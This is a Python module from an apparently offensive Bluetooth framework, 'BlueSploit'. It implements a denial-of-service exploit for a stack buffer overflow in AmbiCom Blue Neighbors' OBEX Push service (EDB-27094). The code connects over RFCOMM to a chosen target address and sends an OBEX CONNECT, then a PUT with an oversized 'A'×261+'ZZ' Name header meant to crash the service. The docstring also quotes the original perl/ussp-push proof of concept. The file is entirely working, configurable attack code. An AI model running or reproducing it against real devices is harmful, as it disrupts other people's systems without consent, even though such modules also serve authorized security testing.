"""
BlueSploit Module: AmbiCom Blue Neighbors OBEX Push BoF
EDB-ID: 27094  /  BID 16258

The OBEX Object Push service in AmbiCom Blue Neighbors crashes when sent
a long filename via OPUSH. The reference PoC uses ussp-push:

    ussp-push <addr>@1 B `perl -e 'print "A"x261 . "ZZ"'`

This module replicates the same effect natively over RFCOMM (channel 1)
by sending an OBEX CONNECT then a PUT with a very long Name header.
"""

import struct
import time
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# OBEX opcodes
OBEX_CONNECT = 0x80
OBEX_PUT     = 0x02
OBEX_PUT_END = 0x82

# OBEX HI (header identifiers)
HI_NAME      = 0x01     # null-terminated UTF-16BE
HI_LENGTH    = 0xC3     # 4-byte length
HI_TYPE      = 0x42     # null-terminated ASCII
HI_BODY      = 0x48     # variable
HI_END_BODY  = 0x49


def _name_header(name: str) -> bytes:
    """Build an OBEX Name header (UTF-16BE, null-terminated)."""
    encoded = name.encode("utf-16-be") + b"\x00\x00"
    # 1 byte HI + 2 bytes length (incl. HI+len) + payload
    hdr_len = 3 + len(encoded)
    return struct.pack(">BH", HI_NAME, hdr_len) + encoded


def _build_connect() -> bytes:
    """OBEX CONNECT: version=0x10, flags=0, mtu=0xFFFF."""
    body = struct.pack(">BBH", 0x10, 0x00, 0xFFFF)   # 4 bytes
    pkt  = struct.pack(">BH", OBEX_CONNECT, 3 + len(body)) + body
    return pkt


def _build_oversize_put(length: int = 261) -> bytes:
    """OBEX PUT with oversized Name header (BoF trigger)."""
    long_name = "A" * length + "ZZ"        # mirrors the original 'A'x261+'ZZ'
    name_hdr  = _name_header(long_name)
    pkt_len   = 3 + len(name_hdr)
    return struct.pack(">BH", OBEX_PUT_END, pkt_len) + name_hdr


class Module(DosModule):
    """
    AmbiCom Blue Neighbors OBEX Push BoF

    Sends an OBEX CONNECT followed by a PUT with a 263-character Name
    header that overflows AmbiCom's stack buffer.
    """

    info = ModuleInfo(
        name="dos/ambicom_obex_bof",
        description="AmbiCom Blue Neighbors OBEX Push buffer overflow (EDB-27094)",
        author=["Original: anonymous via SecurityFocus BID 16258"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/27094",
            "https://www.securityfocus.com/bid/16258",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target", required=True,
                description="Target BD_ADDR running AmbiCom OPUSH",
            ),
            "channel": ModuleOption(
                name="channel", required=False, default=1,
                description="RFCOMM channel for OBEX Push (default 1)",
            ),
            "length": ModuleOption(
                name="length", required=False, default=261,
                description="Number of 'A' characters before the 'ZZ' overflow marker",
            ),
        }

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("Install pybluez2: pip install pybluez2")
            return False

        target  = self.target
        channel = int(self.get_option("channel"))
        length  = int(self.get_option("length"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*55}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}AmbiCom OBEX Push BoF (EDB-27094){C.RESET}             {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
        print_info(f"Target : {target}  RFCOMM ch.{channel}")
        print_info(f"Payload: 'A'×{length} + 'ZZ'")
        print_warning("Authorized testing only — target service will crash")

        sock = None
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.settimeout(10)
            print_info("Connecting to OBEX Push (RFCOMM)...")
            sock.connect((target, channel))
            print_success("Connected")

            # OBEX CONNECT
            sock.send(_build_connect())
            try:
                _ = sock.recv(1024)        # CONNECT_RSP (ignored)
            except Exception:
                pass

            # Oversized PUT
            payload = _build_oversize_put(length)
            print_info(f"Sending PUT with {len(payload)}-byte Name header...")
            sock.send(payload)
            print_success("Overflow packet delivered")
            time.sleep(1)
            try:
                resp = sock.recv(1024)
                print_info(f"Response: {len(resp)} bytes")
            except Exception:
                print_info("No response — service likely crashed")

            self.add_result({
                "target": target, "edb_id": 27094,
                "channel": channel, "overflow_length": length,
                "packet_sent": True,
            })
            return True

        except (OSError, IOError) as e:
            print_error(f"Connection error: {e}")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
